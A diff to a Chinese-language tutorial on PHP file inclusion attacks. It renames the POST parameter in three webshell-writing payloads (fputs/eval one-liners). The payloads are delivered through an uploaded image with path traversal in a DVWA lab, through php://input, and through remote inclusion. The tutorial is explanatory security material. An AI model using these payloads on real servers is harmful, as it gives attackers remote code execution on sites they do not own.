@@ -102,7 +102,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 * 包含图片马写shell
 
 ```
-上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval(\$_POST[xxser]);?>")?>，
+上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>")?>，
 上传后图片路径为/uploadfile/201643.jpg，当访问
 http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时，
 将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[xxser]);?>
@@ -136,7 +136,7 @@ index.php?page=/etc/httpd/conf/httpd.conf
 
 ```
 allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提
-交数据<?php fputs(fopen("shell.php","w"),"<?php eval($_POST['xxxser']);?>") ?>
+交数据<?php fputs(fopen("shell.php","w"),"<?php eval($_POST['cmd']);?>") ?>
 结果将在index.php所在文件下生成一句话文件shell.php
 ```
 ![文件包含-用PHP封装协议写shell1](/img/post/file_include_enprotocol1.png)
@@ -192,7 +192,7 @@ Linux：
 ### 0x08 远程包含
 注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
 ![文件包含-远程包含](/img/post/file_include_remote_include.png)
-若在a.txt写入```<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[xxx]); ?>") ?>```，可直接写shell
+若在a.txt写入```<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST['cmd']); ?>") ?>```，可直接写shell
 
 ### 0x09 漏洞防御
 ```
